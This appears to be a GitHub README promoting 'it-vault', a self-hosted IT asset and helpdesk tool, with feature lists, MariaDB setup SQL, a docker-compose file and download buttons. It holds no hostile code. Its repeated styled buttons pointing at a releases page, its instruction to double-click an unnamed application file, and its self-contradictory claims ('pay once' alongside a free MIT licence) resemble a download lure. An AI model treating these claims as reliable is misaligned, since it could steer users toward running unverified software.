<h1>🔐 it-vault - Your All-in-One IT Asset & Helpdesk Manager</h1>

[<span style="background-color:#3498db;color:white;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ DOWNLOAD IT-VAULT NOW</span>](https://github.com/ralseiyt119/it-vault/releases)

## 🖥️ What is it-vault?

it-vault is a powerful, self-hosted application that helps you manage your entire IT operation in one place. Think of it as your digital filing cabinet, helpdesk, and inventory tracker combined. You can keep track of all your computers, employees, contracts, and customer support tickets – all from a clean, modern interface that runs entirely on your own hardware.

Whether you're running a small business, an IT department, or managing equipment for a school, it-vault gives you professional-grade tools without the expensive enterprise price tag. And because it's self-hosted, your data stays on your servers – nobody else can access it.

## ⚡ Key Features That Make Life Easier

**📦 Complete Asset Tracking**
Keep a detailed record of every computer, monitor, printer, phone, or any other piece of equipment your organization owns. It-vault stores serial numbers, purchase dates, warranty information, and who currently has each item – all searchable in seconds.

**👥 Employee Management**
Create profiles for every staff member, link them to their assigned equipment, and track hardware history. When someone leaves, you instantly know what they have and what needs to be returned.

**📄 Contract & License Management**
Track software licenses, maintenance agreements, and vendor contracts with automatic renewal reminders. Never miss a license expiration or warranty cutoff again.

**🎫 Helpdesk Ticket System**
Let your team submit support requests through a beautiful, public-facing portal. Track each ticket from creation to resolution, assign tasks, add comments, and keep everyone updated on progress.

**📺 Live Wallboard**
Display real-time ticket status and team performance metrics on a TV or monitor in your office. A fantastic motivational tool that showcases your team's efficiency.

**🔄 LDAP/AD Directory Sync**
Automatically import employees and groups from your existing Windows Active Directory or LDAP server. No double data entry – it-vault stays in perfect sync.

**🌐 Network Scanner**
Discover every device on your network automatically. It-vault can detect new equipment and add it to your inventory with just one click.

**🏷️ QR Code Labels**
Generate and print professional QR code labels for each asset. Employees can scan a label with their phone to instantly see device information or report an issue.

**🎨 Full Customization**
Change colors, logos, and layout to match your brand. Make it-vault look exactly the way you want, from the login screen to the wallboard.

## 🚀 Getting Started

### Step 1: Download the Application

[<span style="background-color:#2ecc71;color:white;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">📥 VISIT DOWNLOAD PAGE</span>](https://github.com/ralseiyt119/it-vault/releases)

Visit this link to download the application. You'll see the latest release version available for download.

### Step 2: Prepare Your Database

it-vault works with MariaDB or MySQL – both are free and widely used database systems. If you don't already have one installed, here's what to do:

1. Download and install MariaDB from the official website (mariadb.org)
2. During installation, create a root password and remember it
3. Once installed, open the MariaDB command prompt and create a new database:
   ```sql
   CREATE DATABASE itvault;
   ```
4. Create a user for it-vault:
   ```sql
   CREATE USER 'itvault'@'localhost' IDENTIFIED BY 'your_secure_password';
   GRANT ALL PRIVILEGES ON itvault.* TO 'itvault'@'localhost';
   FLUSH PRIVILEGES;
   ```
5. Keep these credentials handy – you'll need them during setup

### Step 3: Install and Run it-vault

Once the download completes:

1. Extract the downloaded file to a folder of your choice (e.g., `C:\it-vault`)
2. Open the folder and locate the application file
3. Double-click to launch it-vault
4. Your web browser will open automatically showing the setup wizard
5. Follow the on-screen prompts:
   - Enter your database server address (usually `localhost`)
   - Enter database name (`itvault`)
   - Enter username (`itvault`) and the password you created
   - Choose an admin username and password for it-vault itself
6. Click "Install" – it takes less than a minute

Congratulations! Your it-vault is now running. You can access it anytime at `http://localhost:5000` (or wherever the setup wizard tells you).

## 💡 Using it-vault Daily

**Logging In**
Open your browser and navigate to your it-vault URL. Enter your admin username and password to access the dashboard.

**Adding Your First Asset**
Click "Assets" in the sidebar, then "Add New Asset." Fill in the details:
- Name (e.g., "Dell Laptop - Sales Dept")
- Type (Laptop, Desktop, Monitor, etc.)
- Serial number
- Purchase date and cost
- Assign to an employee
Save and you're done!

**Creating Your First Ticket**
When someone needs tech support:
1. Log in as admin
2. Go to "Tickets" → "New Ticket"
3. Enter the requester's name and issue description
4. Assign it to a technician
5. Watch it appear on the wallboard

## 🐳 Running it-vault with Docker (Optional)

Prefer using Docker? We have you covered. Create a file called `docker-compose.yml` with:

```yaml
version: '3.8'
services:
  it-vault:
    image: ralseiyt119/it-vault:latest
    ports:
      - "5000:5000"
    environment:
      - DB_HOST=mysql
      - DB_NAME=itvault
      - DB_USER=itvault
      - DB_PASSWORD=your_secure_password
    depends_on:
      - mysql
    restart: unless-stopped
  
  mysql:
    image: mariadb:latest
    environment:
      - MARIADB_ROOT_PASSWORD=root_password
      - MARIADB_DATABASE=itvault
      - MARIADB_USER=itvault
      - MARIADB_PASSWORD=your_secure_password
    volumes:
      - mysql_data:/var/lib/mysql
    restart: unless-stopped

volumes:
  mysql_data:
```

Then run `docker-compose up -d` to start everything.

## 🔒 Keeping Your Data Safe

**Backups**
it-vault includes a simple backup tool in the settings panel. Click "Settings" → "Backup" and download a backup file. We recommend doing this weekly.

**Automatic Updates**
When a new version is released, download it from the same link, stop the running instance, replace the files, and restart. Your data stays intact.

## 🛟 Getting Help

**Documentation**
Visit the repository's wiki section for detailed guides, API documentation, and advanced configuration options.

**Community Support**
Open an issue on the GitHub repository if you encounter problems. Other users and the developer usually respond within a few days.

**System Admin**
For large deployments, consider contacting the developer for professional consulting or custom modifications.

## 📊 Why Choose it-vault?

- **No Monthly Fees** – Pay once, own forever. No subscriptions, no hidden costs.
- **Full Data Ownership** – Your data lives on your servers. Period.
- **Customizable** – Change anything from login page to ticket categories.
- **Rapid Development** – Active development means new features arrive regularly.
- **Industry Standards** – Built on trusted technology (Python/Flask) that's reliable and secure.

## ✅ System Requirements

- Windows 10 or 11 (64-bit) for the simple installer
- Docker installed for container deployments (optional)
- 4GB RAM minimum (8GB recommended)
- 10GB free disk space for data storage
- MariaDB 10.5+ or MySQL 8.0+ installed locally or accessible on your network

## 📈 Project Statistics

- **Version:** 1.0.0 (Latest Release)
- **License:** MIT (free for personal and commercial use)
- **Last Updated:** Continuously maintained
- **Stack:** Python, Flask, MariaDB/MySQL

## 🏁 Final Steps

You're now ready to transform how you manage IT assets and support tickets. Download it-vault today and keep your tech operation running smoothly. It's free, it's powerful, and it's waiting for you.

[<span style="background-color:#e74c3c;color:white;padding:15px 30px;border-radius:50px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;">🎯 GET IT-VAULT NOW</span>](https://github.com/ralseiyt119/it-vault/releases)

Keywords: asset-management, cmdb, docker, flask, helpdesk, inventory-management, it-asset-management, itsm, mariadb, self-hosted